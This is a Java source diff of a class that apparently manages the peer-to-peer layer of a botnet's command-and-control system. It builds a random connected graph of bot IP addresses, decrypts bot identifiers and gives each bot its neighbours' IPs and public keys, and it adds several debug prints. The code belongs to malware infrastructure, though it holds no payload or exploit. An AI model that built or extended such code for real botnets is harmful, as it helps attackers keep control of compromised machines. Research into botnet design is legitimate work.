@@ -7,6 +7,7 @@ import java.io.UnsupportedEncodingException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.List;
@@ -26,6 +27,7 @@ import cs.sii.control.command.MyGnmRandomGraphDispenser;
 import cs.sii.control.command.MyVertexFactory;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
+import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.dao.BotServiceImpl;
@@ -41,6 +43,9 @@ public class P2PMan {
 	@Autowired
 	private CryptoPKI pki;
 
+	@Autowired
+	private NetworkService nServ;
+
 	public UndirectedGraph<IP, DefaultEdge> getGraph() {
 		return graph;
 	}
@@ -52,7 +57,10 @@ public class P2PMan {
 	public void initP2P() {
 		graph = createNetworkP2P();
 		System.out.println("blab " + graph);
-
+		nServ.setNeighbours(myNeighbours(nServ.getMyIp().getIp()));
+		for (Pairs<IP, PublicKey> p : nServ.getNeighbours().getList()) {
+			System.out.println("ip vicinato= " + p.getValue1());
+		}
 	}
 
 	/**
@@ -75,14 +83,19 @@ public class P2PMan {
 		// creo grafo partenza
 		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
 		List<Bot> bots = bServ.findAll();
+		System.out.println("idbot peer to peer");
 
 		ArrayList<IP> nodes = new ArrayList<IP>();
 		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));
+		System.out.println("idbot peer to peer 2");
 
 		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
 				new SecureRandom(), true, false);
+		System.out.println("idbot peer to peer 3");
 		MyVertexFactory<IP> nodeIp = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
+		System.out.println("idbot peer to peer 4");
 		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
+		System.out.println("idbot peer to peer 5");
 		for (IP ip2 : nodes) {
 			System.out.println("gli archi di  " + graph.degreeOf(ip2));
 		}
@@ -152,14 +165,17 @@ public class P2PMan {
 	@SuppressWarnings("unchecked")
 	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P(List<Pairs<IP, IP>> edge, List<IP> nodes) {
 
-		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,	new SecureRandom(), true, false);
-		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
+		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
+				new SecureRandom(), true, false);
+		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
+				DefaultEdge.class);
 		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes, new SecureRandom());
-//		g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
+		// g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
+		// new SecureRandom(), true, false);
 		for (IP ip : nodes) {
 			graph.addVertex(ip);
 		}
-		//controllare se inserire anche arco  inverso
+		// controllare se inserire anche arco inverso
 		for (Pairs<IP, IP> pair : edge) {
 			graph.addEdge(pair.getValue1(), pair.getValue2());
 		}
@@ -188,7 +204,7 @@ public class P2PMan {
 		String idBot;
 		Bot bot = null;
 		idBot = pki.getCrypto().decryptAES(data);
-		if(idBot==null)
+		if (idBot == null)
 			return null;
 		System.out.println("id bot " + idBot);
 		bot = bServ.searchBotId(idBot);
@@ -242,6 +258,42 @@ public class P2PMan {
 		return ostream.toByteArray();
 	}
 
+	public SyncIpList<IP, PublicKey> myNeighbours(String data) {
+
+		Set<DefaultEdge> setEd = graph.edgesOf(new IP(data));
+		DefaultEdge[] a = new DefaultEdge[setEd.size()];
+		setEd.toArray(a);
+
+		SyncIpList<IP, PublicKey> ipN = new SyncIpList<IP, PublicKey>();
+
+		for (int i = 0; i < a.length; i++) {
+
+			IP s = graph.getEdgeSource(a[i]);
+			IP t = graph.getEdgeTarget(a[i]);
+			if (!s.equals(new IP(data))) {
+				Bot sB = bServ.searchBotIP(s);
+				Pairs<IP, PublicKey> ps = new Pairs<IP, PublicKey>();
+				ps.setValue1(new IP(sB.getIp()));
+				ps.setValue2(pki.rebuildPuK(sB.getPubKey()));
+				ipN.add(ps);
+				// ipN.getList().add(ps);
+				// ipN.add(new Pairs<IP, PublicKey>(new
+				// IP(sB.getIp()),(pki.rebuildPuK(sB.getPubKey()))));
+
+			}
+			if (!t.equals(new IP(data))) {
+				Bot tB = bServ.searchBotIP(t);
+				Pairs<IP, PublicKey> pt = new Pairs<IP, PublicKey>();
+				pt.setValue1(new IP(tB.getIp()));
+				pt.setValue2(pki.rebuildPuK(tB.getPubKey()));
+				ipN.add(pt);
+				// ipN.getList().add(pt);
+			}
+
+		}
+
+		return ipN;
+	}
 	//
 
 }
